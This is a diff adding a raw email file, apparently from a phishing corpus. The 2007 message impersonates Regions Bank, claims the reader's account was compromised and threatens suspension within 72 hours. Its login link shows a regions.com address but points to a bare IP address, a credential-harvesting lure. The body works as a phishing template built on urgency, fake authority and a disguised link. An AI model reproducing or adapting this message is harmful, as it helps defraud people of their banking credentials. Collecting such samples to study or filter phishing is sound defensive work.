@@ -1,0 +1,65 @@
+Return-Path: <service@regions.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 781C246937
+	for <user@login.example.com>; Mon,  5 Feb 2007 10:14:42 -0500 (EST)
+X-Greylist: delayed 1859 seconds by postgrey-1.27 at mail.example.org; Mon, 05 Feb 2007 10:14:42 EST
+Received: from slp3d.com (mail.or-live.com [65.36.168.20])
+	by mail.example.org (Postfix) with ESMTP id 43F64131FD42
+	for <user@example.com>; Mon,  5 Feb 2007 10:14:42 -0500 (EST)
+Received: from UnknownHost [82.152.14.142] by slp3d.com with SMTP;
+   Mon, 5 Feb 2007 09:41:44 -0500
+Reply-To: <do-not-reply@regions.com>
+From: "Regions Bank"<service@regions.com>
+Subject: Dear Customer ,
+Date: Mon, 5 Feb 2007 14:41:44 -0000
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070205151442.43F64131FD42@mail.example.org>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 756
+
+<html>
+<img src="http://knueppel.at/regions.gif"><br><br>
+<font face="Verdana" size=2>Dear Regions Bank Customer,<br><br>
+You have received this email because we have strong reasons to believe
+that your Regions Bank account had been recently compromised. In order to
+prevent any fraudulent activity from occurring we are required to open
+an investigation into this matter.
+<br><br>
+Per the User Agreement, Section 9, we may immediately issue a warning,
+temporarily suspend, indefinitely suspend or terminate your membership
+and refuse to provide our services to you if we believe that your
+actions may cause financial loss or legal liability for you, our users
+or us. We may also take these actions if we are unable to verify or
+authenticate any information you provide to us.
+<br><br>
+If your account information is not updated within the next 72
+hours, then we will assume this account is fraudulent and will be
+suspended. We apologize for this inconvenience, but the purpose of
+this verification is to ensure that your Regions Bank account has not been
+fraudulently used and to combat fraud.
+<br><br>
+Please login into your account at this link, which is a SSL secured
+connection:
+<br><br>
+
+<a href="http://80.227.146.195/Web/index.html">https://www.regions.com/profile_verification/index.htm</a>
+<br><br>
+<font color=red><b>Please remember that Regions Bank will never ask you for your PIN.</font></b><br><br>
+Regards,
+<br>
+Safeharbor Department<br>
+Regions Bank, Inc.<br><br>
+</html>
+
